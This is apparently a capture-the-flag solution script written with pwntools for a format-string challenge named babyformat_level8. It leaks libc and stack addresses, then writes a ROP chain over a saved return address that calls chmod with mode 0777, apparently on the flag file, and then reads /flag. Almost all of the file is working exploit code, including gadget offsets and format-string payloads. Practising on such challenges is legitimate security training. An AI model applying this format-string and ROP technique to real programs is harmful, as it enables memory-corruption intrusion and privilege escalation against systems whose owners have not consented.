
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template babyformat_level8
from pwn import *
from os import system

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level8')
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

def f():
    try:
        payload= b'%3$llx %188$llx aaaaaaaaaaaaaaaaaa%188$hhn'
        io.recvuntil(b'then exit.')
        io.sendline(payload)
        io.recvuntil(b"Your input is:")
        io.recvline()
        leak_bytes = io.recvline(keepends=False)
        leak = leak_bytes.decode().split(" ")

        leaked_libc = int(leak[0], 16)
        libc_base = leaked_libc - 0x10e077
        print(f"leaked libc_base : 0x{libc_base:x}")
        leaked_rbp = leak[1]
        rbp_func = int(leaked_rbp, 16)
        rbp_main = rbp_func + 80
        print(f"rbp_main : 0x{rbp_main:x}")
        print(f"rbp_func : 0x{rbp_func:x}")
        rbp_func2 = rbp_func - 16
        print(f"rbp_func2 : 0x{rbp_func2:x}")
        rsp_func2 = rbp_func2 - 1456  # 1456 = diff between rbp and rsp of func2
        print(f"rsp_func2 : 0x{rsp_func2:x}")
        rip_func2 = rbp_func2 + 8
        print(f"rip_func2 : 0x{rip_func2:x}")
        canary = rbp_func2 - 8
        print(f"canary : 0x{canary:x}")

        # payload2 = b'%3$llx %188$llx'
        # io.recvuntil(b'then exit.')
        # io.sendline(payload2)
        # io.recvuntil(b"Your input is:")
        # io.recvline()
        # bytes_leaked = io.recvline(keepends=False)
        # leak_2 = bytes_leaked.decode().split(" ")
        # rbp_leaked = leak_2[1]
        # func_rbp = int(rbp_leaked, 16)
        # main_rbp = func_rbp + 80
        # print(f"main_rbp : 0x{main_rbp:x}")
        # print(f"func_rbp : 0x{func_rbp:x}")
        # func2_rbp = func_rbp - 16
        # print(f"func2_rbp : 0x{func2_rbp:x}")
        # func2_rsp = func2_rbp - 1456  # 1456 = diff between rbp and rsp of func2
        # print(f"func2_rsp : 0x{func2_rsp:x}")
        # func2_rip = func2_rbp + 8
        # print(f"func2_rip : 0x{func2_rip:x}")

        # print(f"rbp func2 difference : {rbp_func2 - func2_rbp}")

            
        # rbp main, rbp func, rbp func2, libc base are correct

        base = libc_base
        rip_func =  rip_func2 - 160  # rip of func2 1st time - rip of func2 2nd time
        pop_rdi = base+0x23b6a 
        pop_rsi = base+0x2601f 
        pop_rdx = base+0x142c92 
        pop_rax = base+0x36174  
        syscall = base+0x2284d  
        print("2nd payload start")
        p2 = b"A"*4 + fmtstr_payload(74, {
            rip_func : p64(pop_rdi).ljust(8, b"\x00"),
            rip_func + 8 : p64(base + 0x1eb1f3).ljust(8, b"\x00"),
            rip_func + 16 : p64(pop_rsi).ljust(8, b"\x00"),
            rip_func + 24 : p64(0o777),
            rip_func + 32 : p64(pop_rdx).ljust(8, b"\x00"),
            rip_func + 40 : p64(0),
            rip_func + 48 : p64(pop_rax).ljust(8, b"\x00"),
            rip_func + 56 : p64(0x5a),
            rip_func + 64 : p64(syscall).ljust(8, b"\x00")
            }, numbwritten=144,  write_size='short', strategy='fast')

        print("2nd payload end")
        io.recvuntil(b'then exit.')
        io.sendline(p2)   
        print("payload p2 sent successfully")
        system("cat /flag")
        
        io.interactive()
    except EOFError:
        print("End of input reached")   

f()

# for i in range(40):
#     print("loop number : ",i)
    # f()
    # try:
    #     f()
    # except:    
    #    print("An exception occurred in loop : ", i)     